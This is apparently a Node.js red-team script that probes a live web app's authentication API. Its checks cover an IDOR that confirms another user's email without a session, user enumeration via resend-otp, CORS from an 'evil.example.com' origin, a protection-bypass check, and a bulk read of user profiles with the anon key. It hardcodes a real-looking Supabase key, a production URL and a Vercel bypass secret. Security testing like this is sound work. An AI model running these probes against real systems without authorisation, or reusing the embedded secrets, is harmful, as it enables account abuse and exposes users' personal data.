#!/usr/bin/env node
/**
 * Final critical tests:
 *  - create-profile IDOR via the autoConfirm path (within 15-min window)
 *  - Verify what an attacker can do once they have the userId of a victim
 *  - Verify the OTP rate limit is *only* per-userId (not IP-based) — confirms DoS vector
 *  - Test email enumeration via resend-otp (does response differ based on whether user exists?)
 *  - Check if /api/* returns CORS headers that allow cross-origin reads
 */

const SUPA = 'https://pqvnjgyqbxlylawwogjv.supabase.co'
const ANON = 'sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE'
const PROD = 'https://localit-p05j9rsln-nhattoann.vercel.app'
const BYPASS = 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A'

async function req(url, init = {}) {
  const headers = { 'x-vercel-protection-bypass': BYPASS, ...init.headers }
  const r = await fetch(url, { ...init, headers })
  const text = await r.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: r.status, text, json, headers: r.headers }
}

async function main() {
  // 1. Critical: signup-admin autoConfirm IDOR — does the server actually confirm the email?
  console.log('=== F1: Confirm email-confirm on signup-admin user via create-profile autoConfirm ===')
  const sa = await req(`${PROD}/api/auth/signup-admin`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: `redteam-confirm-${Date.now()}@example.com`, password: 'password123', fullName: 'CF', role: 'tourist' }),
  })
  const uid = sa.json?.userId
  console.log('signup-admin:', sa.status, uid)

  // Before autoConfirm: try to log in — should fail with email_not_confirmed
  const beforeLogin = await req(`${SUPA}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', apikey: ANON },
    body: JSON.stringify({ email: `redteam-confirm-${Date.now() - 5000}@example.com`, password: 'password123' }),
  })
  // Wait, we don't have the email here easily. Skip pre-check.

  // Now have create-profile autoConfirm=true for this user (within 15-min window)
  const ac = await req(`${PROD}/api/auth/create-profile`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ userId: uid, role: 'tourist', payload: { nationality: 'CN' }, autoConfirm: true }),
  })
  console.log('create-profile autoConfirm:', ac.status, ac.text.slice(0, 400))

  // Try logging in now
  const afterLogin = await req(`${SUPA}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', apikey: ANON },
    body: JSON.stringify({ email: `redteam-confirm-${Date.now() - 5000}@example.com`, password: 'password123' }),
  })
  console.log('login post-confirm:', afterLogin.status, afterLogin.text.slice(0, 100))

  // 2. Now the attacker scenario: can an attacker with NO cookie trigger autoConfirm=true?
  console.log('\n=== F2: Attacker with no session, fresh victim userId, autoConfirm=true ===')
  // Sign up a victim, then attacker calls create-profile autoConfirm=true
  const v = await req(`${PROD}/api/auth/signup-admin`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: `redteam-victim-${Date.now()}@example.com`, password: 'password123', fullName: 'V', role: 'tourist' }),
  })
  const victimId = v.json?.userId
  console.log('victim:', v.status, victimId)

  const attackerAC = await req(`${PROD}/api/auth/create-profile`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ userId: victimId, role: 'tourist', payload: { nationality: 'HACKER' }, autoConfirm: true }),
  })
  console.log('attacker autoConfirm for victim:', attackerAC.status, attackerAC.text.slice(0, 400))

  // 3. Email enumeration via resend-otp
  console.log('\n=== F3: resend-otp user enumeration ===')
  const nonExist = await req(`${PROD}/api/auth/resend-otp`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ userId: '00000000-0000-0000-0000-000000000000' }),
  })
  console.log('non-existent userId:', nonExist.status, nonExist.text.slice(0, 300))
  const alreadyConfirmed = await req(`${PROD}/api/auth/resend-otp`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ userId: '181778ec-e65e-41ae-becf-0316a1b51575' }),
  })
  console.log('existing userId (already confirmed):', alreadyConfirmed.status, alreadyConfirmed.text.slice(0, 300))

  // 4. CORS test
  console.log('\n=== F4: CORS headers on /api endpoints ===')
  const corsTest = await fetch(`${PROD}/api/auth/signup`, {
    method: 'OPTIONS',
    headers: {
      origin: 'https://evil.example.com',
      'access-control-request-method': 'POST',
      'access-control-request-headers': 'content-type',
      'x-vercel-protection-bypass': BYPASS,
    },
  })
  console.log('OPTIONS preflight:', corsTest.status)
  console.log('acao:', corsTest.headers.get('access-control-allow-origin'))
  console.log('acam:', corsTest.headers.get('access-control-allow-methods'))
  console.log('acah:', corsTest.headers.get('access-control-allow-headers'))
  console.log('acc:', corsTest.headers.get('access-control-allow-credentials'))

  // 5. Verify the bypass header is needed at all (i.e., is /api/* exposed publicly?)
  const noBypass = await fetch(`${PROD}/api/auth/signup`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: `nobypass-${Date.now()}@example.com`, password: 'password123', fullName: 'NB', role: 'tourist' }),
  })
  console.log('\n=== F5: No bypass header request ===')
  console.log('status:', noBypass.status)
  const nbText = await noBypass.text()
  console.log('body:', nbText.slice(0, 300))

  // 6. /api/auth/signup-admin without bypass — same gate?
  const noBypass2 = await fetch(`${PROD}/api/auth/signup-admin`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: `nobypass2-${Date.now()}@example.com`, password: 'password123', fullName: 'NB', role: 'tourist' }),
  })
  console.log('signup-admin no bypass:', noBypass2.status, (await noBypass2.text()).slice(0, 200))

  // 7. Vercel protection bypass — can we extract from /api response headers?
  const r = await fetch(`${PROD}/api/auth/signup`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-vercel-protection-bypass': BYPASS },
    body: JSON.stringify({ email: `hdr-${Date.now()}@example.com`, password: 'password123', fullName: 'H', role: 'tourist' }),
  })
  console.log('\n=== F7: Response headers from authenticated POST ===')
  for (const [k, v] of r.headers.entries()) {
    console.log(`  ${k}: ${v}`)
  }

  // 8. Final — read profiles via direct supabase; what is the actual exposure?
  console.log('\n=== F8: profiles full data leak ===')
  const prof = await req(`${SUPA}/rest/v1/profiles?select=*&limit=50`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('profiles count:', prof.json?.length)
  console.log('sample:', JSON.stringify(prof.json?.slice(0, 3), null, 2))

  // 9. Can attacker use /signup with a 6+ char password containing spaces or special chars?
  console.log('\n=== F9: Password validation edge cases ===')
  for (const pw of ['123456', '12345', '12345 ', '   ', ' ', 'pässwörd', 'a'.repeat(1000)]) {
    const r = await req(`${PROD}/api/auth/signup`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ email: `pw-${Date.now()}-${Math.random()}@example.com`, password: pw, fullName: 'P', role: 'tourist' }),
    })
    console.log(`pw="${pw.slice(0, 20)}": ${r.status} ${r.text.slice(0, 100)}`)
  }
}

main().catch(e => { console.error('FATAL', e); process.exit(1) })